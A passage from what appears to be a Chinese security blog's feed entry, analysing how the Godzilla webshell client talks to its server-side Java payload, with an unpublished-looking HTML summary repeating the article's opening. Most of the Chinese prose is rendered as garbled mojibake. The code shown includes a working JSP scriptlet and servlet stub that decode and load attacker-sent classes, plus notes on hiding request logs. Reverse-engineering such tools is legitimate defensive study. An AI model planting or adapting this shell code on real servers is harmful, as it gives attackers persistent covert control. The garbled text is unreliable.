keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">evalFunc</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">,</span> parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token class-name">String</span> codeString <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>codeString<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>isAlive <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>codeString<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">fillParameter</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> funcName<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">ReqParameter</span> parameter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>className <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> className<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        parameter<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"evalClassName"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClassName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    parameter<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"methodName"</span><span class="token punctuation">,</span> funcName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">evalFunc</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> funcName<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">ReqParameter</span> parameter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fillParameter</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> funcName<span class="token punctuation">,</span> parameter<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ç»„è£…å‚æ•°methodNametest</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> parameter<span class="token punctuation">.</span><span class="token function">formatEx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> functions<span class="token punctuation">.</span><span class="token function">gzipE</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//gzipå‹ç¼©åŠ å¯†</span>    <span class="token keyword">return</span> functions<span class="token punctuation">.</span><span class="token function">gzipD</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">sendHttpResponse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å‘é€è¯·æ±‚ä¹‹åæ¥æ”¶æ•°æ®ï¼Œç„¶åè§£å¯†è§£å‹ç¼©</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å“¥æ–¯æ‹‰å®¢æˆ·ç«¯çš„æµç¨‹ï¼šå…ˆåœ¨æœ¬åœ°ç»„è£…æœ¬æ¬¡è¯·æ±‚çš„å‚æ•°ï¼Œå‹ç¼©ä¹‹ååŠ å¯†å‘é€åˆ°æœåŠ¡ç«¯ã€‚</p><p>æ­¤æ—¶åœ¨æ‰“ä¸ªæ–­ç‚¹åšä¸€æ¬¡è°ƒè¯•çœ‹çœ‹ï¼š<br><img src="/2022/05/17/godzilla/8.png"></p><h4 id="f-equals-arrOut"><a href="#f-equals-arrOut" class="headerlink" title="f.equals(arrOut)"></a><code>f.equals(arrOut)</code></h4><p>ç¬¬ä¸€æ¬¡è¿›å…¥åˆ°payloadçš„equalså‡½æ•°ï¼ŒarrOutæ˜¯<code>ByteArrayOutputStream</code>å˜é‡ï¼Œä¼ é€’ç»™<code>this.outputStream</code>ï¼Œåˆå§‹åŒ–ä¸€ä¸ªè¾“å‡ºå¯¹è±¡ï¼Œç”¨äºè·å–payloadæ‰§è¡Œç»“æœï¼Œæœ€ç»ˆè¿”å›ç»™å®¢æˆ·ç«¯ã€‚<br><img src="/2022/05/17/godzilla/10.png"></p><h4 id="f-equals-data"><a href="#f-equals-data" class="headerlink" title="f.equals(data)"></a><code>f.equals(data)</code></h4><p>dataæ˜¯å“¥æ–¯æ‹‰å®¢æˆ·ç«¯ä¼ é€’ç»™æœåŠ¡ç«¯çš„æ•°æ®ï¼ŒæœåŠ¡ç«¯å…ˆè¿›è¡Œè§£å¯†ï¼Œç„¶åè¿›å…¥<code>f.equals(data)</code>å‡½æ•°ï¼Œç„¶åè¿›å…¥<code>handle()</code>å‡½æ•°è¿›è¡Œå˜é‡åˆå§‹åŒ–æ“ä½œï¼š<br><img src="/2022/05/17/godzilla/11.png"><br>ä¸Šè¿°æ“ä½œå®Œæˆä¹‹åï¼Œè¿›å…¥<code>this.formatParameter()</code>å‡½æ•°ï¼Œå¯¹ä¸Šä¸€æ­¥è·å–åˆ°çš„<code>this.requestData</code>è§£å‹ç¼©ä¹‹åå¾ªç¯åˆ¤æ–­å“¥æ–¯æ‹‰ä¼ é€’è¿‡æ¥çš„æ•°æ®ï¼Œæœ€åæ”¾åˆ°<code>this.paramterMap</code>:<br><img src="/2022/05/17/godzilla/12.png"></p><p>ç¬¬äºŒæ¬¡çš„<code>equals</code>å®Œæˆäº†å¯¹å“¥æ–¯æ‹‰ä¼ é€’è¿‡æ¥æ•°æ®çš„åˆå§‹åŒ–ï¼Œæœ€ç»ˆæ”¾åˆ°<code>this.paramterMap</code>ä¿å­˜ã€‚</p><h4 id="f-equals-req"><a href="#f-equals-req" class="headerlink" title="f.equals(req)"></a><code>f.equals(req)</code></h4><p><img src="/2022/05/17/godzilla/9.png"><br>ç¬¬ä¸‰æ¬¡equalsçš„æ—¶å€™æ‰§è¡Œ<code>f.equals(req)</code>ï¼Œè¿›å…¥åˆ°<code>handle()</code>å‡½æ•°ï¼Œå¡«å……<code>this.servletRequest</code>å¯¹è±¡ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">supportClass</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"%s.servlet.http.HttpServletRequest"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>servletRequest <span class="token operator">=</span> obj<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">supportClass</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"%s.servlet.ServletRequest"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>servletRequest <span class="token operator">=</span> obj<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè¿›å…¥<code>this.handlePayloadContext()</code>åˆ©ç”¨<code>payload.class</code>é‡Œé¢å®šä¹‰å¥½çš„åå°„å‡½æ•°ï¼Œè·å–<code>servletRequest</code>, <code>servletContext</code>, <code>httpSession</code>å¯¹è±¡ï¼Œç„¶åå¡«å……ç»™payloadå˜é‡ï¼š<br><code>this.servletRequest</code>ã€<code>this.servletContext</code>ã€<code>this.httpSession</code>ã€‚</p><p>ç»§ç»­è·Ÿè¿›åˆ¤æ–­<code>this.servletRequest</code>ä¸ä¸ºç©ºçš„æ—¶å€™ï¼Œå°è¯•è·å–<code>servletRequest</code>é‡Œé¢çš„<code>parameters</code>å¯¹è±¡ï¼Œç»è¿‡åˆ¤æ–­ä¹‹åèµ‹ç»™<code>this.requestData</code>ã€‚<br><img src="/2022/05/17/godzilla/13.png"></p><p>è¿™é‡Œä¹‹æ‰€ä»¥åˆå¡«å……ä¸€æ¬¡<code>this.requestData</code>å˜é‡ï¼Œæ˜¯ä¸ºäº†å…¼å®¹æ€§è€ƒè™‘ï¼Œæ¯”å¦‚åœ¨Springé‡Œé¢ç›´æ¥å†™servletï¼Œç»è¿‡ç¬¬äºŒæ¬¡çš„<code>equals()</code>å°±å¡«å……äº†<code>this.requestData</code>å¯¹è±¡ï¼Œä½†æ˜¯åœ¨JSPé‡Œé¢ï¼Œæ˜¯åˆ©ç”¨<br><code>request.setAttribute(&quot;parameters&quot;, data);</code>æ¥èµ°åˆ°ä¸Šé¢è¿™ä¸€æ­¥å¡«å……<code>this.requestData</code>å¯¹è±¡ï¼Œè¿™ä¹Ÿæ˜¯å“¥æ–¯æ‹‰å¯¹servletæ²¡æœ‰ä¾èµ–çš„ä¸»è¦åŸå› ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">  <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>payload <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                payload <span class="token operator">=</span> <span class="token function">defClass</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//                Object f = payload.newInstance();</span>                <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"basic.payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨JSPé‡Œé¢è§£æ<code>pageContext</code>å¯¹è±¡:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">X</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Q</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"parameters"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>            f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            f<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ç€ä¼šèµ°åˆ°<code>nolog</code>é‡Œé¢ï¼Œåˆ©ç”¨åå°„éšè—è¯·æ±‚çš„æ—¥å¿—ã€‚è¿™é‡Œåº”è¯¥æ˜¯åªéšè—åœ¨tomcatä¸‹çš„æ—¥å¿—ï¼Œæœªæµ‹è¯•ã€‚</p><h4 id="f-toString"><a href="#f-toString" class="headerlink" title="f.toString()"></a><code>f.toString()</code></h4><p>ä»<code>this.paramterMap</code>é‡Œé¢è·å–è¦æ‰§è¡Œçš„æ¨¡å—å‚æ•°ç­‰å˜é‡ï¼Œç„¶åè¿›å…¥<code>this.run()</code>æ‰§è¡Œ<code>payload.class</code>å®šä¹‰å¥½çš„shellåŠŸèƒ½ï¼š<br><img src="/2022/05/17/godzilla/7.png"></p><p>ç¬¬ä¸‰æ¬¡è¯·æ±‚æ˜¯è°ƒç”¨äº†<code>methodNameClose</code>å‡½æ•°ï¼Œä¸å†åˆ†æã€‚æ•´ä¸ªæµç¨‹åˆ†æä¸‹æ¥ä¼šå‘ç°å“¥æ–¯æ‹‰ä¸€å¼€å§‹å°±æŠŠä¸€ä¸ªå¤§é©¬çš„åŠŸèƒ½å®ç°å‘é€åˆ°äº†æœåŠ¡ç«¯ï¼Œä¹‹åçš„åŠŸèƒ½éƒ½æ˜¯é€šè¿‡è°ƒç”¨å¤§é©¬å®ç°å¥½çš„åŠŸèƒ½å®Œæˆçš„ã€‚</p><p>è‡³æ­¤Y4erå¸ˆå‚…çš„æ–‡ç« ç®—æ˜¯çœ‹æ‡‚äº†ï¼š<a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">è§£å†³å“¥æ–¯æ‹‰å†…å­˜é©¬pagecontextçš„é—®é¢˜</a></p><p>åœ¨Springé‡Œé¢çš„ä¸‰ä¸ª<code>equeals</code>:</p><ul><li>f.equals(arrOut) å¿…é¡»çš„ï¼Œä½¿ç”¨ByteArrayOutputStreamè¿”å›æ‰§è¡Œçš„ç»“æœ</li><li>f.equals(data)   å¿…é¡»çš„ï¼Œæ¥æ”¶å®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„å‚æ•°</li><li>f.equals(req)    éå¿…è¦ï¼Œå¯¹äºSpringçš„Servletæ˜¯éå¿…è¦çš„ï¼Œç”¨äºéšè—æ—¥å¿—ã€‚</li></ul><p>æ‰€ä»¥åœ¨Springé‡Œé¢çš„Servletï¼Œç¬¬ä¸‰ä¸ª<code>equals</code>å»æ‰ä¸å½±å“æ­£å¸¸shellåŠŸèƒ½ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">è§£å†³å“¥æ–¯æ‹‰å†…å­˜é©¬pagecontextçš„é—®é¢˜</a></li><li><a href="https://mp.weixin.qq.com/s/lmL6XyWKClEmYgiVUspYYw">å“¥æ–¯æ‹‰æºç åˆ†æ(äºŒ)jsp shellåˆ†æ</a></li><li><a href="https://tttang.com/archive/1513/">Javaååºåˆ—åŒ–æ³¨å…¥å†°èå†…å­˜é©¬ç›¸å…³è¸©å‘ç¬”è®°</a></li><li><a href="https://github.com/rebeyond/Behinder/issues/151">æƒ³å°è¯•ä¿®æ”¹åˆ°Spring boot å†…å­˜é©¬çš„æ”¯æŒä¸­ï¼Œè€ŒSpringæ²¡æœ‰pageContextå¯¹è±¡</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;åˆ†æèƒŒæ™¯&quot;&gt;&lt;a href=&quot;#åˆ†æèƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;åˆ†æèƒŒæ™¯&quot;&gt;&lt;/a&gt;åˆ†æèƒŒæ™¯&lt;/h2&gt;&lt;p&gt;èµ·æºäº&lt;code&gt;Y4er&lt;/code&gt;å¸ˆå‚…å‘çš„ä¸¤ç¯‡æ–‡ç« ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://tttang.com/archive/1513/&quot;&gt;Javaååºåˆ—åŒ–æ³¨å…¥å†°èå†…å­˜é©¬ç›¸å…³è¸©å‘ç¬”è®°&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/&quot;&gt;è§£å†³å“¥æ–¯æ‹‰å†…å­˜é©¬pagecontextçš„é—®é¢˜&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¯¹å…¶ä¸­çš„åŸå› æ¯”è¾ƒå¥½å¥‡ï¼Œæ‰€ä»¥å°è¯•å¯¹å“¥æ–¯æ‹‰åšäº†ä¸€æ¬¡åŸç†åˆ†æï¼Œæµ‹è¯•ä»£ç åœ¨&lt;a href=&quot;https://github.com/JKme/MemoryShellDemo&quot;&gt;MemoryShellDemo&lt;/a&gt;ã€‚æ–‡ç« å¯èƒ½æœ‰é”™è¯¯çš„åœ°æ–¹ï¼Œå¯ä»¥åœ¨&lt;a href=&quot;https://github.com/JKme/JKme.github.io/issues&quot;&gt;issue&lt;/a&gt;ç•™è¨€ã€‚&lt;/p&gt;
&lt;h2 id=&quot;è¿è¡ŒåŸç†&quot;&gt;&lt;a href=&quot;#è¿è¡ŒåŸç†&quot; class=&quot;headerlink&quot; title=&quot;è¿è¡ŒåŸç†&quot;&gt;&lt;/a&gt;è¿è¡ŒåŸç†&lt;/h2&gt;&lt;p&gt;ä»å“¥æ–¯æ‹‰çš„æºä»£ç é‡Œé¢æ‰£å‡ºæ¥&lt;code&gt;godzilla\shells\payloads\java\assets\payload.classs&lt;/code&gt;æ–‡ä»¶ï¼Œä½¿ç”¨&lt;a href=&quot;https://github.com/leibnitz27/cfr&quot;&gt;https://github.com/leibnitz27/cfr&lt;/a&gt;åç¼–è¯‘ä¹‹åï¼Œåœ¨ideaé‡Œé¢æ–°å»º&lt;code&gt;payload.java&lt;/code&gt;æ–‡ä»¶ï¼Œç„¶åä¿®æ”¹è¯¯æŠ¥é”™ï¼Œ&lt;a href=&quot;https://gist.github.com/JKme/690c9562155c019570afd5ab06356658&quot;&gt;è¿™é‡Œ&lt;/a&gt;æ˜¯åç¼–è¯‘å¥½ä¹‹åçš„æ–‡ä»¶ã€‚&lt;code&gt;payload.java&lt;/code&gt;å®ç°äº†å¤§éƒ¨åˆ†çš„shellæ“ä½œï¼Œæ¯”å¦‚æŸ¥çœ‹æ–‡ä»¶ã€æ‰§è¡Œå‘½ä»¤ã€æ•°æ®åº“è¿æ¥ç­‰ç­‰&lt;/p&gt;
&lt;p&gt;æ–°å»ºä¸€ä¸ª&lt;code&gt;HelloServlet.java&lt;/code&gt;ï¼Œç”¨äºåŠ¨æ€è°ƒè¯•ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;basic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;servlet&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;servlet&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;annotation&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;WebServlet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;servlet&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;http&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HttpServlet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;servlet&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;http&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HttpServletRequest&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;servlet&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;http&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HttpServletResponse&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;IOException&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
